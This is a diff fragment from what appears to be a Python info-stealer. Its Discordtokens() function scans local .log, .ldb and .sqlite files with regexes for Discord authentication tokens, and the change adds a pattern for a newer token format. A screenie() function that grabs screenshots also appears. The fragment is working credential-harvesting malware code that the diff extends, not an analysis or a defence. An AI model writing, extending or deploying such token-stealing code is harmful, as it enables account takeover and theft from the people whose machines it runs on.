@@ -545,13 +545,13 @@ def Discordtokens():
                 if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                     with open(os.path.join(path, file_name), errors="ignore") as file:
                         for line in file.readlines():
-                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}",r"[\w-]{24}\.[\w-]{6}\.[\w-]{23}-[\w-]{14}"):
                                 for token in re.findall(regex, line):
                                     if f"{token} | {platform}" not in tokens:
                                         tokens.append(token)
     except:
         pass                                    
-    return token                                    
+    return token                                     
 
 def screenie():
     sss = ImageGrab.grab()
